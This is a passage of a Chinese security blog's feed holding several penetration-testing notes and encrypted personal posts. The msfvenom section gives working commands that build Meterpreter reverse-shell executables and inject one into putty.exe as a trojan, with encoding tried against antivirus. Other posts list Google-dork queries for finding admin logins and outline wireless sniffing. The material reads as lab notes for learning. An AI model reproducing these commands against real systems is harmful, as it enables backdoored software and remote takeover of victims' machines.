formats</span><br><span class="line">asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war</span><br><span class="line">Transform formats</span><br><span class="line">bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</span><br></pre></td></tr></table></figure></p><p>6)查payload选项<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    ----  ---------------  --------  -----------</span><br><span class="line">root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp --payload-options</span><br><span class="line">Options for payload/windows/x64/meterpreter/reverse_tcp:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       Name: Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">     Module: payload/windows/x64/meterpreter/reverse_tcp</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x64 #是指生成的payload只能在64位系统运行 </span><br><span class="line">Needs Admin: No</span><br><span class="line"> Total size: 449</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">    skape &lt;mmiller@hick.org&gt;</span><br><span class="line">    sf &lt;stephen_fewer@harmonysecurity.com&gt;</span><br><span class="line">    OJ Reeves</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">Name      Current Setting  Required  Description</span><br><span class="line">----      ---------------  --------  -----------</span><br><span class="line">EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">LHOST                      yes       The listen address</span><br><span class="line">LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Inject the meterpreter server DLL via the Reflective Dll Injection </span><br><span class="line">  payload (staged x64). Connect back to the attacker (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Advanced options for payload/windows/x64/meterpreter/reverse_tcp:</span><br><span class="line"></span><br><span class="line">    Name                         Current Setting  Required  Description</span><br><span class="line">    ----                         ---------------  --------  -----------</span><br><span class="line">    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension</span><br><span class="line">    AutoRunScript                                 no        A script to run automatically on session creation.</span><br></pre></td></tr></table></figure></p><p>2.生成payload<br>1)将payload注入到putty中(会被360杀掉）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/xmeterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4443 -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /root/putty.exe -k -f exe -o /root/Desktop/putty_evil.exe</span><br><span class="line">Skipping invalid encoder x64/shikata_ga_nai</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 867840 bytes</span><br><span class="line">Saved as: /root/Desktop/putty_evil.exe</span><br></pre></td></tr></table></figure></p><p>2)windows x64(被杀）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4441 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></p><p>3)linux<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.230  LPORT=4441 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具" scheme="http://note.cfyqy.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>三秒钟的记忆</title>
    <link href="http://note.cfyqy.com/posts/11dc13a6.html"/>
    <id>http://note.cfyqy.com/posts/11dc13a6.html</id>
    <published>2018-04-21T15:53:00.000Z</published>
    <updated>2018-09-18T09:29:58.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" 请输入文章密码！ " /> <label for="pass"> 请输入文章密码！ </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是篇受保护的文章！
    
    </summary>
    
      <category term="生活" scheme="http://note.cfyqy.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="胡思乱想" scheme="http://note.cfyqy.com/categories/%E7%94%9F%E6%B4%BB/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
      <category term="生活" scheme="http://note.cfyqy.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="胡思乱想" scheme="http://note.cfyqy.com/tags/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>混生活吗？</title>
    <link href="http://note.cfyqy.com/posts/d851c108.html"/>
    <id>http://note.cfyqy.com/posts/d851c108.html</id>
    <published>2018-04-21T13:54:00.000Z</published>
    <updated>2018-09-18T09:29:29.431Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" 请输入文章密码！ " /> <label for="pass"> 请输入文章密码！ </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>  <script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是篇受保护的文章！
    
    </summary>
    
      <category term="生活" scheme="http://note.cfyqy.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="胡思乱想" scheme="http://note.cfyqy.com/categories/%E7%94%9F%E6%B4%BB/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
      <category term="生活" scheme="http://note.cfyqy.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="胡思乱想" scheme="http://note.cfyqy.com/tags/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>web渗透技术知识小记</title>
    <link href="http://note.cfyqy.com/posts/bb6c190a.html"/>
    <id>http://note.cfyqy.com/posts/bb6c190a.html</id>
    <published>2018-04-20T11:05:00.000Z</published>
    <updated>2018-09-18T09:28:57.658Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透脑图"><a href="#渗透脑图" class="headerlink" title="渗透脑图"></a>渗透脑图</h1><h2 id="1-渗透步骤漏洞"><a href="#1-渗透步骤漏洞" class="headerlink" title="1.渗透步骤漏洞"></a>1.渗透步骤漏洞</h2><p><img src="/posts/../../images/naotu/shentou.jpg" alt=""></p><h2 id="2-渗透思路脑图"><a href="#2-渗透思路脑图" class="headerlink" title="2.渗透思路脑图"></a>2.渗透思路脑图</h2><p><img src="/posts/../../images/naotu/4.jpg" alt=""></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-域名、ip等信息查询在线网站"><a href="#1-域名、ip等信息查询在线网站" class="headerlink" title="1.域名、ip等信息查询在线网站"></a>1.域名、ip等信息查询在线网站</h2><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">站长之家</a><br><a href="http://www.links.cn/" target="_blank" rel="noopener">seo站长帮手</a><br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">站长统计</a><br><a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">爱站</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步在线</a><br><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a><br><a href="http://www.whomx.com/" target="_blank" rel="noopener">虎妈查</a><br><a href="https://github.com/search?utf8=%E2%9C%93&amp;q=&amp;type=" target="_blank" rel="noopener">github</a><br><a href="https://exploits.shodan.io" target="_blank" rel="noopener">shadon</a><br><a href="https://www.zoomeye.org" target="_blank" rel="noopener">ZoomEy</a><br><a href="https://search.yahoo.com/" target="_blank" rel="noopener">雅虎搜索</a><br><a href="http://www.dogpile.com/?qc=video" target="_blank" rel="noopener">Dogpile</a>  </p><h2 id="2-开放的端口查询"><a href="#2-开放的端口查询" class="headerlink" title="2.开放的端口查询"></a>2.开放的端口查询</h2><p>1.常用的工具<br>1)nmap扫描<br><a href="http://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">2)masscan</a>  </p><h2 id="3-web漏洞查找"><a href="#3-web漏洞查找" class="headerlink" title="3.web漏洞查找"></a>3.web漏洞查找</h2><p>1.后台查找<br>1）Googlehack<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xx.com intext:管理  </span><br><span class="line">site:xx.com intext: 用户名 密码 </span><br><span class="line">site:xx.com inurl:login</span><br><span class="line">site:xx.com inurl:manage</span><br><span class="line">site:xx.com inurl:admin</span><br><span class="line">site:xx.com intitle:后台</span><br><span class="line">site:xx.com intitle: 管理</span><br></pre></td></tr></table></figure></p><p>2）御剑<br>2.目录漏洞<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index of </span><br><span class="line">to parent directory</span><br></pre></td></tr></table></figure></p><p>3.工具检测漏洞<br>wvs<br>appscan<br>椰树<br>4.sql注入工具<br>sqlmap  </p><h2 id="4-系统漏洞查找"><a href="#4-系统漏洞查找" class="headerlink" title="4.系统漏洞查找"></a>4.系统漏洞查找</h2><p>1.nessus  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息收集" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息收集" scheme="http://note.cfyqy.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>无线渗透测试小识</title>
    <link href="http://note.cfyqy.com/posts/8599fc6c.html"/>
    <id>http://note.cfyqy.com/posts/8599fc6c.html</id>
    <published>2018-04-05T11:04:00.000Z</published>
    <updated>2018-09-18T09:26:00.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="监听wifi"><a href="#监听wifi" class="headerlink" title="监听wifi"></a>监听wifi</h1><p>无线网络中的信号是以广播模式发送的，所有用户就可以在传送管程中截获到这些信息。<br>1.网卡的工作模式<br>无线网卡是采用无线信号进行数据传输的终端。<br>4种模式：<br>广播模式：它的物理地址是0xffffff的帧为广播帧，工作在广播模式的网卡接受广播帧<br>多播传送：多播传送地址作为目的物理地址的帧可以被组内的其他主机同时接收，而组外主机却接收不到。但是如果将网卡设置为多播传送模式，它可以接收所有的多播传送帧，而不论它是不是组内成员。<br>直接模式：工作在混杂模式下的网卡只接收目的地址是自己mac地址的帧。<br>混杂模式：工作在混杂模式下的网卡，接受所有的流过网卡的帧。通信包捕获程序就是在这种模式下运行的。<br>2.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwconfig 查看无线接口的配置信息 </span><br><span class="line">ifconfig 查看接口的配置信息</span><br></pre></td></tr></table></figure></p><p>3.Aircrack-ng套件中的小工具<br><figure class="highlight bash"><table><tr><td 